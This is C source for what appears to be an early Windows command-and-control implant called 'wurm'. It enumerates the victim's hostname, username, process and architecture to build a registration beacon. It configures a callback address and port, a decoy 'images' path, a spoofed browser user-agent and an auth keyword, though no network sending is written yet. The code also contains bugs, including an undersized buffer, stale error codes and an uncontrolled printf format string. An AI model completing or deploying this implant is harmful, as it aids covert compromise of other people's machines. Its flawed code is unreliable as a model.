#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>

struct {
    struct {
        CHAR* address;
        CHAR* path;
        CHAR* user_agent;
        INT     port;
    } http;
    struct {
        CHAR* cookie;
        CHAR* keyword;
    } auth;
    struct {
        CHAR* status;
        CHAR* format;
    } data;
    struct {
        CHAR* name;
        CHAR    hostname[MAX_PATH];
        CHAR    username[MAX_PATH];
        CHAR    arch[MAX_PATH];
        CHAR    product[MAX_PATH];
        DWORD   pid;
    } info;
} wurm;

void Register() {
    // Set local variables
    DWORD default_length = 256;
    DWORD dw_error = GetLastError();

    // Structures and handles for tlhelp32
    PROCESSENTRY32 process_info;
    process_info.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    // Set data allocation format
    wurm.data.status = "register";
    wurm.data.format = "%s:%s";

    // Enumerate local machine for information
    if (GetComputerNameA(wurm.info.hostname, &default_length)) {
        printf("Hostname: %s\n", wurm.info.hostname);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetUserNameA(wurm.info.username, &default_length)) {
        printf("Username: %s\n", wurm.info.username);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetCurrentProcessId()) {
        wurm.info.pid = GetCurrentProcessId();
        printf("Process ID: %lu\n", wurm.info.pid);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (Process32First(snapshot, &process_info)) {
        while (Process32Next(snapshot, &process_info)) {
            if (wurm.info.pid == process_info.th32ProcessID) {
                wurm.info.name = process_info.szExeFile;
                printf("Process Name: %s\n", wurm.info.name);
            }
        }
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    if (GetEnvironmentVariableA("PROCESSOR_ARCHITECTURE", wurm.info.arch, default_length)) {
        printf("Operating System Arch: %s\n", wurm.info.arch);
    }
    else {
        printf("Error: %lu\n", dw_error);
    }

    // Allocate memory to be encoded
    /*
    Registration data structure:

    */
    INT data_length = strlen(wurm.data.format) + strlen(wurm.data.status) + strlen(wurm.info.hostname);
    CHAR* data_to_encode = malloc(data_length);
    sprintf_s(data_to_encode, data_length, wurm.data.format, wurm.data.status, wurm.info.hostname);

    printf(data_to_encode);

    // Clean up memory and handles
    CloseHandle(snapshot);
    free(data_to_encode);
}

int main(int argc, char* argv[]) {
    if (argc == 2) {
        wurm.http.address = argv[1];
        wurm.http.port = 1337;

    }
    else if (argc == 3) {
        wurm.http.address = argv[1];
        wurm.http.port = atoi(argv[2]);

    }
    else {
        wurm.http.address = "127.0.0.1";
        wurm.http.port = 1337;
    }

    printf("Attempting to connect to: %s:%d\n", wurm.http.address, wurm.http.port);

    // Set default HTTP options
    wurm.http.path = "images";
    wurm.http.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";

    // Set default authentication options
    wurm.auth.cookie = NULL;
    wurm.auth.keyword = "licketysplit";

    // Attempt initial beacon with registration data
    Register();
}